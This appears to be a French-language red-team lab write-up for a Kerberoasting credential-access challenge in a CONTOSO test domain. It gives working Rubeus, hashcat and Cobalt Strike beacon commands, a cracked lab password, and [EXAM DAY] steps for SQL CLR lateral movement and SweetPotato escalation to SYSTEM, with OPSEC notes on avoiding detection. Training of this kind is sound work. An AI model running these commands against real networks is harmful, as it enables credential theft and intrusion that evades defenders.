# Challenge Credential Access — commandes et explications  

>Énumérer les comptes actifs possédant un **SPN**, en excluant `krbtgt` et les comptes désactivés.  

## Énumération des comptes  

```sh
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```  

<img src="/images/credential-access-challenge01.png" width=860>  

>Repérer les éventuels comptes leurres (*honeypot*) afin de les distinguer des comptes réels.

>Cibler uniquement le compte `mssql_svc` pour récupérer son hash Kerberos.  

```sh
ppid 8276   //  (explorer.exe) → good parent for the sacrificial process

spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
// DO NOT override spawnto again before execute-assembly

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```  

<img src="/images/credential-access-challenge02.png" width=860>

## Cassage du hash  

> Utiliser Hashcat pour tester le hash Kerberoasting.

```bash
# Kerberoast hash — mode 13100 (NOT 18200 which is AS-REP roast)
hashcat -a 0 -m 13100 /media/skippypeanut/2tb-hiksemi/hashcat-cracking/cred-acc-challenge.hash ../wordlists/rockyou.txt
```

> **Erreur fréquente :** le mode `18200` correspond à l’AS-REP Roasting (`$krb5asrep

> ). Pour le hash Kerberoasting `$krb5tgs

>  de cet exemple, utiliser `13100`. Un mauvais mode peut produire `Separator unmatched / No hashes loaded`.

| Mode | Attaque | Préfixe du hash | Commande Rubeus |
|------|--------|-------------|----------------|
| `13100` | Kerberoasting | `$krb5tgs$23$*` | `kerberoast /user:mssql_svc /nowrap` |
| `18200` | AS-REP Roasting | `$krb5asrep$23$` | `asreproast /format:hashcat /nowrap` |

> **Résultat du lab du 17/04/2026 :** mot de passe `Passw0rd!` retrouvé pour `mssql_svc`.

## Utiliser les identifiants obtenus

```cs
spawnas CONTOSO\mssql_svc Passw0rd! tcp-local
[04/17 18:08:55] [*] Tasked beacon to spawn windows/beacon_bind_tcp (127.0.0.1:1337) as CONTOSO\mssql_svc
[04/17 18:09:00] [+] host called home, sent: 334544 bytes
[04/17 18:09:03] [+] established link to child beacon: 10.10.121.108
```  

## Post-Exploitation  

> **Contexte du lab :** seul un Domain Controller est présent, sans SQL Server. Les étapes `[EXAM DAY]` illustrent un environnement plus complet et ne sont pas exécutables dans ce challenge.

Script SQL-BOF chargé : `C:\Tools\SQL-BOF\SQL\SQL.cna`.

<img src="/images/credential-access-challenge03.png" width=860>

### Vérifier le contexte du Beacon `mssql_svc`

```cs
beacon> getuid                        // OPSEC-🟢SAFE — built-in, no child process
beacon> process_browser               // OPSEC-🟢SAFE — built-in GUI tab, no child process

// Check for SeImpersonatePrivilege — present on SQL service accounts
beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawns spawnto process)
```

> **Vérifier `SeImpersonatePrivilege` :** la présence de ce privilège dépend de la configuration du compte et peut ouvrir une possibilité de Privilege Escalation vers SYSTEM.

### Énumérer le système de fichiers

```cs
beacon> file_browser                                         // OPSEC-🟢SAFE — built-in GUI, no child process
beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-🟢SAFE — built-in beacon command
beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE — built-in beacon command
beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — built-in beacon command
```

### [EXAM DAY] Énumérer les SQL Server

```cs
// Enumerate SQL instances via LDAP SPN query
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
//                                                            // OPSEC-🟢SAFE — BOF, runs in beacon thread

beacon> sql-info lon-db-1                                     // OPSEC-🟢SAFE — SQL BOF, no child process
beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — SQL BOF, no child process

// If not sysadmin — check linked servers
beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF, no child process
```

### [EXAM DAY] Lateral Movement avec SQL CLR

```cs
beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — confirm sysadmin before proceeding

beacon> sql-enableclr lon-db-1                                // OPSEC-🟠CAUTION — modifies SQL server config (sp_configure change, detectable in SQL audit log)
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
//                                                            // OPSEC-🟠CAUTION — loads CLR assembly into SQL, visible in sys.assemblies

beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connects to waiting SMB beacon, no new process
```

### [EXAM DAY] Privilege Escalation avec `SeImpersonatePrivilege`

```cs
// SweetPotato — payload must be pre-staged on the SQL host as tcp-local EXE
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
//                                                            // OPSEC-🟠CAUTION — fork & run (execute-assembly spawns spawnto process)
beacon> connect localhost 1337                                // OPSEC-🟢SAFE — links to SYSTEM beacon over TCP, no new process
```

### [EXAM DAY] Nettoyer SQL CLR

```cs
beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — reverts sp_configure change, logged in SQL audit
```

### Aide-mémoire après l’obtention du Beacon `mssql_svc`

```
mssql_svc beacon obtained
│
├─ Check whoami /priv
│   └─ SeImpersonatePrivilege = Yes
│       → SweetPotato → SYSTEM on current host (Step 5)
│
├─ SQL server in scope?
│   └─ Yes → sql-whoami → sysadmin?
│       ├─ Yes → sql-enableclr → sql-clr → beacon on SQL host (Step 4)
│       └─ No  → check sql-links → lateral via linked server
│
└─ File system enumeration → look for flags, creds, config files (Step 2)
```

